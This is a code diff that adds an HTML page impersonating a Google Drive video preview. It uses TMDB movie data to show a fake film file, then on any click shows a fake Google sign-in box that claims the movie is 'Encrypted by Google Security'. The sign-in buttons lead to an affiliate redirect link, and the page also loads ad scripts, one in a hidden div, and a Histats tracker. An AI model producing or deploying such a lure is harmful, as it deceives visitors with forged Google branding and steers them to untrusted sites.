@@ -1,0 +1,276 @@
+<!DOCTYPE html>
+<html lang="en">
+<head>
+    <meta charset="UTF-8">
+    <meta name="viewport" content="width=device-width, initial-scale=1.0, maximum-scale=1.0, user-scalable=no">
+    
+    <meta property="og:site_name" content="Google Drive">
+    <meta property="og:title" id="og-title" content="Shared Video - Google Drive">
+    <meta property="og:image" id="og-image" content="https://www.gstatic.com/images/branding/product/2x/drive_2020q4_48dp.png">
+    
+    <link rel="icon" type="image/png" href="https://www.gstatic.com/images/branding/product/1x/drive_2020q4_32dp.png">
+    <title id="tab-title">Google Drive - Video Preview</title>
+
+    <link href="https://fonts.googleapis.com/css2?family=Roboto:wght@300;400;500&display=swap" rel="stylesheet">
+    <link rel="stylesheet" href="https://cdnjs.cloudflare.com/ajax/libs/font-awesome/6.4.0/css/all.min.css">
+
+    <style>
+        :root { 
+            --drive-bg: #0d0d0d; 
+            --header-bg: #1a1b1c; 
+            --google-blue: #1a73e8;
+            --hover-white: rgba(255, 255, 255, 0.1);
+        }
+        
+        * { margin:0; padding:0; box-sizing: border-box; -webkit-tap-highlight-color: transparent; }
+        
+        body { 
+            background: var(--drive-bg); 
+            color: #e8eaed; 
+            font-family: 'Roboto', sans-serif; 
+            overflow-y: auto; 
+            min-height: 100vh;
+        }
+
+        .g-header { 
+            position: fixed; top: 0; width: 100%; height: 60px; 
+            background: var(--header-bg); display: flex; align-items: center; 
+            padding: 0 15px; z-index: 2000; border-bottom: 1px solid rgba(255,255,255,0.1);
+        }
+        .h-left { display: flex; align-items: center; gap: 12px; flex: 1; min-width: 0; }
+        .back-btn { font-size: 18px; color: #fff; cursor: pointer; padding: 10px; border-radius: 50%; }
+        .file-info { display: flex; flex-direction: column; min-width: 0; }
+        .file-name { font-size: 15px; font-weight: 400; color: #fff; white-space: nowrap; overflow: hidden; text-overflow: ellipsis; max-width: 250px; }
+        .file-status { font-size: 11px; color: #9aa0a6; }
+
+        .h-right { display: flex; align-items: center; gap: 2px; }
+        .h-icon { width: 40px; height: 40px; display: flex; align-items: center; justify-content: center; color: #fff; font-size: 17px; cursor: pointer; border-radius: 50%; }
+
+        .preview-container { 
+            padding-top: 80px; 
+            display: flex; 
+            flex-direction: column; 
+            align-items: center; 
+            min-height: calc(100vh - 60px); 
+        }
+
+        .player-wrapper { 
+            width: 92%; 
+            max-width: 900px; 
+            aspect-ratio: 16/9; 
+            background: #000; 
+            border-radius: 8px; 
+            position: relative; 
+            overflow: hidden; 
+            cursor: pointer; 
+            box-shadow: 0 10px 50px rgba(0,0,0,0.8); 
+        }
+        
+        #backdrop { position: absolute; inset: 0; background-size: cover; background-position: center; opacity: 0.75; filter: brightness(0.7); transition: transform 0.5s ease; }
+        .overlay { position: absolute; inset: 0; display: flex; align-items: center; justify-content: center; z-index: 10; background: rgba(0,0,0,0.2); }
+        .play-btn { width: 68px; height: 68px; background: rgba(32, 33, 36, 0.85); border: 2.5px solid #fff; border-radius: 50%; display: flex; align-items: center; justify-content: center; }
+        .play-btn i { color: #fff; font-size: 24px; margin-left: 5px; }
+        
+        .spinner { display: none; width: 48px; height: 48px; border: 3px solid rgba(255,255,255,0.2); border-top-color: #fff; border-radius: 50%; animation: spin 0.8s linear infinite; }
+        @keyframes spin { to { transform: rotate(360deg); } }
+
+        .v-controls { position: absolute; bottom: 0; width: 100%; height: 45px; background: linear-gradient(transparent, rgba(0,0,0,0.8)); display: flex; align-items: center; padding: 0 15px; gap: 15px; z-index: 20; }
+        .v-progress-bg { position: absolute; top: 0; left: 0; right: 0; height: 3px; background: rgba(255,255,255,0.2); }
+        .v-progress-red { width: 0%; height: 100%; background: #ea4335; }
+        .v-time { font-size: 11px; color: #fff; flex: 1; }
+        .quality-tag { font-size: 9px; font-weight: 700; background: #fff; color: #000; padding: 1px 3px; border-radius: 2px; }
+
+        .footer-scroll-area { 
+            width: 100%; 
+            margin-top: 40px; 
+            padding-bottom: 50px; 
+            display: flex; 
+            flex-direction: column; 
+            align-items: center; 
+        }
+
+        .copyright-claim { 
+            color: #9aa0a6; 
+            font-size: 11px; 
+            margin-bottom: 20px; 
+            display: flex; 
+            align-items: center; 
+            gap: 6px; 
+        }
+        
+        .ad-banner-container { 
+            width: 95%; 
+            max-width: 728px; 
+            min-height: 90px; 
+            background: rgba(255,255,255,0.03); 
+            border-radius: 4px;
+            display: flex;
+            justify-content: center;
+            align-items: center;
+            overflow: hidden;
+        }
+
+        .modal-overlay { 
+            display: none; position: fixed; inset: 0; 
+            background: rgba(0, 0, 0, 0.55); z-index: 9999; 
+            align-items: center; justify-content: center; 
+            backdrop-filter: blur(4px); 
+        }
+        .google-card { 
+            background: #ffffff; width: 100%; max-width: 380px; padding: 40px 30px; 
+            border-radius: 12px; text-align: center; color: #202124; position: relative; 
+        }
+        .google-logo { width: 70px; margin-bottom: 20px; }
+        .signin-title { font-size: 22px; font-weight: 400; margin-bottom: 8px; }
+        .btn-next { background: var(--google-blue); color: #fff; padding: 10px 24px; border-radius: 4px; font-weight: 500; text-decoration: none; border: none; cursor: pointer; }
+    </style>
+</head>
+<body>
+
+<nav class="g-header">
+    <div class="h-left">
+        <i class="fas fa-arrow-left back-btn" onclick="history.back()"></i>
+        <div class="file-info">
+            <div class="file-name" id="h-title">Loading...</div>
+            <div class="file-status" id="file-size-info">MP4 • -- GB</div>
+        </div>
+    </div>
+    <div class="h-right">
+        <div class="h-icon" onclick="startBuffering()"><i class="far fa-star"></i></div>
+        <div class="h-icon" onclick="startBuffering()"><i class="fas fa-download"></i></div>
+    </div>
+</nav>
+
+<div class="preview-container">
+    <div class="player-wrapper" onclick="startBuffering()">
+        <div id="backdrop"></div>
+        <div class="overlay">
+            <div class="play-btn" id="play-ui"><i class="fas fa-play"></i></div>
+            <div class="spinner" id="spinner-ui"></div>
+        </div>
+        <div class="v-controls">
+            <div class="v-progress-bg"><div class="v-progress-red"></div></div>
+            <div class="v-time">0:00 / <span id="runtime">--:--</span></div>
+            <span class="quality-tag">HD</span>
+            <i class="fas fa-cog" style="color:white; font-size:13px; opacity:0.6"></i>
+            <i class="fas fa-expand" style="color:white; font-size:13px; opacity:0.6"></i>
+        </div>
+    </div>
+
+    <div class="footer-scroll-area">
+        <div class="copyright-claim">
+            <i class="fas fa-shield-alt"></i>
+            <span>Encrypted by Google Security. Sign in to view full movie.</span>
+        </div>
+
+        <div class="ad-banner-container">
+            <div id="container-ad34baeadf390ae9561e758b0b9442e1">
+                <script async="async" data-cfasync="false" src="https://pl28205077.effectivegatecpm.com/ad34baeadf390ae9561e758b0b9442e1/invoke.js"></script>
+            </div>
+        </div>
+    </div>
+</div>
+
+<div class="modal-overlay" id="loginModal">
+    <div class="google-card">
+        <div class="close-btn" onclick="closeModal()" style="position: absolute; top: 15px; right: 15px; cursor: pointer;"><i class="fas fa-times"></i></div>
+        <img src="https://upload.wikimedia.org/wikipedia/commons/2/2f/Google_2015_logo.svg" class="google-logo">
+        <h2 class="signin-title">Sign in</h2>
+        <p style="color:#3c4043; margin-bottom: 30px;">to continue to Google Drive</p>
+        <div style="border: 1px solid #dadce0; border-radius: 4px; padding: 10px; text-align: left; margin-bottom: 30px; cursor: pointer;" onclick="goToLink()">
+            <i class="fas fa-user-circle" style="color:#5f6368; font-size: 20px; vertical-align: middle;"></i>
+            <span style="font-size: 14px; margin-left: 10px; font-weight: 500;">Use another account</span>
+        </div>
+        <div style="display: flex; justify-content: space-between; align-items: center;">
+            <a href="#" style="color: var(--google-blue); font-size: 14px; text-decoration: none; font-weight: 500;">Create account</a>
+            <button class="btn-next" onclick="goToLink()">Next</button>
+        </div>
+    </div>
+</div>
+
+<script>
+    // TMDB & Data Loading Logic
+    const API_KEY = "22be462e6d3de1dbab03d1ca50847b5a";
+    const IMG_URL = "https://image.tmdb.org/t/p/original";
+    
+    // --- LOGIKA DETEKSI URL (CLEAN URL & QUERY) ---
+    const pathParts = window.location.pathname.split('/').filter(p => p);
+    const urlParams = new URLSearchParams(window.location.search);
+    
+    // Deteksi ID Film (Mendukung /movie/ID atau ?id=ID)
+    let movieID = urlParams.get('id');
+    if (!movieID && pathParts[0] === 'movie' && pathParts[1]) {
+        movieID = pathParts[1];
+    }
+    movieID = movieID || '157336'; // Default ke Interstellar jika tidak ada
+
+    function getPermanentSize(id, runtime) {
+        let hash = 0;
+        for (let i = 0; i < id.length; i++) { hash = id.charCodeAt(i) + ((hash << 5) - hash); }
+        const totalMB = runtime * (15 + (Math.abs(hash) % 10));
+        return totalMB >= 1024 ? (totalMB / 1024).toFixed(1) + " GB" : Math.floor(totalMB) + " MB";
+    }
+
+    async function loadData() {
+        try {
+            const r = await fetch(`https://api.themoviedb.org/3/movie/${movieID}?api_key=${API_KEY}&append_to_response=images`);
+            const d = await r.json();
+            if (d.title) {
+                const title = d.title.replace(/[:\s]+/g, '_') + '_1080p.mp4';
+                document.getElementById('h-title').innerText = title;
+                document.getElementById('tab-title').innerText = title + " - Google Drive";
+                document.getElementById('runtime').innerText = (d.runtime || 120) + ":00";
+                document.getElementById('file-size-info').innerText = `MP4 • ${getPermanentSize(movieID, d.runtime || 110)}`;
+                
+                // Meta Tags Update
+                document.getElementById('og-title').setAttribute('content', title);
+
+                let selectedPath = d.backdrop_path;
+                if (d.images && d.images.backdrops.length > 0) {
+                    const randomIdx = Math.floor(Math.random() * Math.min(d.images.backdrops.length, 5));
+                    selectedPath = d.images.backdrops[randomIdx].file_path;
+                }
+                document.getElementById('backdrop').style.backgroundImage = `url(${IMG_URL + selectedPath})`;
+                document.getElementById('og-image').setAttribute('content', IMG_URL + selectedPath);
+            }
+        } catch (e) {
+            console.error("Data load failed", e);
+        }
+    }
+
+    function startBuffering() {
+        document.getElementById('play-ui').style.display = 'none';
+        document.getElementById('spinner-ui').style.display = 'block';
+        setTimeout(() => {
+            document.getElementById('loginModal').style.display = 'flex';
+            document.getElementById('spinner-ui').style.display = 'none';
+            document.getElementById('play-ui').style.display = 'flex';
+        }, 1200);
+    }
+
+    function goToLink() {
+        window.location.href = 'https://playfloowz.com/c?a=275&o=19&sub2=movie_preview';
+    }
+
+    function closeModal() { document.getElementById('loginModal').style.display = 'none'; }
+    
+    loadData();
+</script>
+
+<div style="display:none;">
+    <script src="https://pl28198684.effectivegatecpm.com/9d/19/06/9d1906d65cc9a7a5b11b74b709961512.js"></script>
+    <script type="text/javascript">
+        var _Hasync= _Hasync|| [];
+        _Hasync.push(['Histats.start', '1,4992391,4,0,0,0,00010000']);
+        _Hasync.push(['Histats.fasi', '1']);
+        _Hasync.push(['Histats.track_hits', '']);
+        (function() {
+            var hs = document.createElement('script'); hs.type = 'text/javascript'; hs.async = true;
+            hs.src = ('//s10.histats.com/js15_as.js');
+            (document.getElementsByTagName('head')[0] || document.getElementsByTagName('body')[0]).appendChild(hs);
+        })();
+    </script>
+</div>
+
+</body>
+</html>
